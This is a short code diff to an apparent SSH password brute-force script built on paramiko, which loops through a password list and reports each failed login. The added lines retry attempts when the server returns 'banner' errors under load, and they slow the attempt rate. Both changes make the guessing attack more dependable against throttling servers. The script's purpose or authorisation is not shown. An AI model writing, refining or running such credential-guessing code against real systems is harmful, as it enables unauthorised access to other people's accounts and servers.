@@ -59,11 +59,17 @@ for i, pwd in enumerate(passwords, 1):
         break
     except paramiko.AuthenticationException:
         print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> FAILED')
+    except paramiko.ssh_exception.SSHException as e:
+        if 'banner' in str(e).lower():
+            print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> RETRY (SSH busy)')
+            time.sleep(2)
+            continue
+        print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> ERROR: {e}')
     except Exception as e:
         print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> ERROR: {e}')
     finally:
         client.close()
-    time.sleep(0.05)
+    time.sleep(0.5)
 
 if not found:
     elapsed = time.time() - start
